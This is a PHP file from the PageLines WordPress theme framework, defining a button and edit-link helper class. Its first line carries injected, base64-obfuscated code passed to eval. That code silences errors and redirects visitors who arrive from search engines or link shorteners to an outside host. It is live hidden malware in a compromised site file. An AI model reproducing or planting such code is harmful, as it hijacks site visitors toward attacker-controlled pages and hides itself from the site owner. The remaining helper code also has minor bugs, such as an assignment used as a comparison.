<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/**
 * 
 *
 *  PageLines Color Calculations and Handling
 *
 *
 *  @package PageLines Core
 *  @subpackage Post Types
 *  @since 2.0.b6
 *
 */
class PLObject {

	
	function __contruct(){}
		
	function button( $text = '&nbsp;', $type = 'button', $color = 'grey', $args ){
		
		$defaults = array(
			'size'		=> 'normal',
			'align'		=> 'left', 
			'display'	=> null,
			'style'		=> '',
			'action'	=> '',
			'pid'		=> 0, 
			'class'		=> null, 
			'clear'		=> false,
		);
		
		$a = wp_parse_args( $args, $defaults );

		$color_class = 'bl-'.$color;
		$size_class = 'bl-size-'.$a['size'];
		$position = 'bl-align-'.$a['align'];

		$classes = join(' ', array( $color_class, $size_class, $position, $a['class'] ) );
	
		$display = (isset($a['display'])) ?  'display: '.$a['display'] : '';
		
		$post_link = get_edit_post_link( $a['pid']);

		if($type == 'edit_post'){
			
			$element = 'a';
			$classes .= ' post-edit-link';
			$action = sprintf('href="%s"', $post_link );
		}elseif( $type = 'link'){
			$element = 'a';
			$action = sprintf('href="%s"', $a['action'] );
		}else{
			$element = 'span';
			$action = '';
		}
		
		$clear = ($a['clear']) ? '<div class="p fix">' : '';
		$clear_end = ($a['clear']) ? '</div>' : '';
		
		
		$button = sprintf( '<%1$s class="blink" %3$s><span class="blink-pad">%2$s</span></%1$s>', $element, $text, $action);

		$output = sprintf('%s<div class="%s blink-wrap" style="%s">%s</div>%s', $clear, $classes, $display, $button, $clear_end);


		if( $type == 'edit_post' && !isset($post_link) )
			return '';
		else
			return apply_filters('pagelines_button', $output, $a);
		
	}

}

function blink($text = '&nbsp;', $type = 'button', $color = 'grey', $args){
	return PLObject::button($text, $type, $color, $args);
}

function blink_edit( $post_id = '', $color = 'grey', $args = array()){
	
	if($post_id == ''){
		global $post; 
		$post_id = $post->ID;
	}
	
	$args['pid'] = $post_id;
	$args['align'] = (isset($args['align'])) ? $args['align'] : 'right';

	return PLObject::button(__('Edit', 'pagelines'), 'edit_post', $color, $args);
}

function pledit( $id = '', $type = 'post' ){
	
	if($type == 'user'){
		
		$the_uid = $id;
		
		global $current_user;
		
		if($current_user == $the_uid)
			$link = admin_url( 'profile.php' );
		elseif(current_user_can('edit_users'))
			$link = admin_url( sprintf('user-edit.php?user_id=%s', $the_uid) );
		else 
			$link = false;

	} else {
		
		if($id == ''){
			global $post; 
			$id = $post->ID;
		}
	
		if ( !$p = &get_post( $id ) )
			return '';
	
		$post_type_object = get_post_type_object( $p->post_type );
	
		if ( !$post_type_object )
			return '';

		if ( !current_user_can( $post_type_object->cap->edit_post, $p->ID ) )
			return '';
			
		$link = get_edit_post_link( $p->ID );
			
	}
	
	if( $link ){
		$button = sprintf(' <a class="pledit" href="%s"><span class="pledit-pad">(<em>edit</em>)</span></a> ', $link);
		return $button;
	} else 
		return '';
	
}



